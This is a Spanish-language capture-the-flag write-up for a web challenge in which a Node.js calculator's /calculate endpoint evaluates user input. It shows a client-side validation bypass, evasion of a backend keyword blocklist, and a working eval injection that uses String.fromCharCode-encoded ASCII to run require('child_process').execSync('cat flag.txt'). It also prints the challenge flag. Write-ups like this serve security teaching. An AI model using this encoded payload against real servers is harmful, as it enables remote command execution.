# 🧮 Challenge 2: The Calculator

**Categoría:** Web Exploitation 

## 📝 Descripción
La aplicación consistía en una calculadora web simple. Al intentar introducir caracteres no numéricos a través de la interfaz, se disparaba una alerta de "Client-Side blocking", impidiendo el envío del formulario.

## 🕵️‍♂️ Reconocimiento (Recon)

* **Detección de Tecnología:** Al forzar un error mediante una petición HTTP malformada, el servidor expuso la cabecera `X-Powered-By: Express`, confirmando que el backend operaba sobre **Node.js**.
* **Análisis del Endpoint:** Las operaciones se realizaban mediante una petición `POST` al endpoint `/calculate`.
* **Vector de Entrada:** El cuerpo de la petición utilizaba JSON:
    ```json
    {
      "expr": "100+100"
    }
    ```

## 💥 Explotación

El proceso de explotación requirió evadir múltiples capas de seguridad:

### 1. Bypass de Validación Client-Side
La validación ocurría únicamente en el navegador (JavaScript). Se interceptó la comunicación utilizando **Burp Suite** para enviar los payloads directamente al servidor, omitiendo las restricciones del frontend.

### 2. Evasión de WAF (Keyword Blocking)
Al intentar inyectar código malicioso estándar de Node.js (ej. `require('child_process')`), el servidor respondía con **"Blocked keyword"**.
* **Análisis:** Existía un filtro (WAF/Blacklist) en el backend buscando cadenas específicas como `require`, `exec` o `spawn`.

### 3. Payload Final (ASCII Encoding)
Para evadir el filtro de palabras clave, se aprovechó la función `String.fromCharCode()` dentro de la sentencia `eval()`.
* **Técnica:** Convertir el comando malicioso a sus valores decimales ASCII. Dado que los números estaban permitidos por la lógica de la calculadora, el filtro no detectó el ataque.

**Comando Objetivo:**
```javascript
require('child_process').execSync('cat flag.txt').toString()
{
    "expr": "eval(String.fromCharCode(114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,102,108,97,103,46,116,120,116,39,41,46,116,111,83,116,114,105,110,103,40,41))"
}
```
Tambien se realizo un exploit en python para poder extraer la flag

🚩 Flag
nexus{7h1s_1s_no7_3v4l_Th1s_15_3v1lllllllllllllllllll}